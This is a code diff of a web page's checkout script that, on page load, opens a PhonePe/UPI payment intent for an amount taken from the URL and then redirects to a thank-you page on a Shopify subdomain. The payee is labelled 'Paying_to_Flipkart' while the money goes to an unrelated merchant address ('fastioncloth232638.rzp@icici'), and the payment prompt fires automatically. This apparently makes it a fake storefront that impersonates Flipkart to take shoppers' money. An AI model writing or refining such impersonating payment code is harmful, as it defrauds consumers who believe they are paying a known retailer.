@@ -952,23 +952,40 @@
         <div class="z-[60] hidden"></div>
     </div>
     <script>
-        function getAmountFromURL() {
-            const params = new URLSearchParams(window.location.search);
-            const amount = params.get("amount");
-            return amount ? parseFloat(amount).toFixed(2) : "0.00";
-        }
+    function getAmountFromURL() {
+        const params = new URLSearchParams(window.location.search);
+        const amount = params.get("amount");
+        return amount ? parseFloat(amount).toFixed(2) : "0.00";
+    }
 
-        function openPhonePePayment() {
-            const amount = getAmountFromURL(); // Get amount from ?amount=
-            const phonePeURL = `phonepe://pay?ver=01&mode=19&pa=fastioncloth232638.rzp@icici&pn=Paying_to_Flipkart&tr=Mairtel&cu=INR&mc=7446&qrMedium=04&tn=Paying_to_Flipkart&am=399`;
-            window.location.href = phonePeURL;
-             window.location.href = upiLink;
-             // After 9 seconds, redirect to thank-you page
-    setTimeout(() => {
-        window.location.href = "https://1fuvdm-p7.myshopify.com/pages/thank-you";
-    }, 9000);
-        }
-    </script>
+    function openPhonePePayment() {
+        const amount = getAmountFromURL();
+
+        // Create intent-based URL
+        const upiLink = `intent://pay?pa=fastioncloth232638.rzp@icici&pn=Paying_to_Flipkart&tr=Mairtel&am=${amount}&cu=INR&tn=Payment&mc=0000&mode=02#Intent;scheme=upi;package=com.phonepe.app;end`;
+
+        // Open UPI app
+        window.location.href = upiLink;
+
+        // Wait 9 seconds for user to return (assuming payment is made)
+        setTimeout(() => {
+            // If page is visible again, user came back (assumption)
+            if (document.visibilityState === 'visible') {
+                // Simulate checking with user (real way would involve server)
+                const isPaid = confirm("Did you complete the payment?");
+                if (isPaid) {
+                    window.location.href = "https://1fuvdm-p7.myshopify.com/pages/thank-you";
+                } else {
+                    window.location.href = "https://1fuvdm-p7.myshopify.com/pages/payment-failed";
+                }
+            }
+        }, 9000);
+    }
+
+    // Automatically call on page load (or use a button)
+    openPhonePePayment();
+</script>
+
     <script>
         function getAmountFromURL() {
             const params = new URLSearchParams(window.location.search);
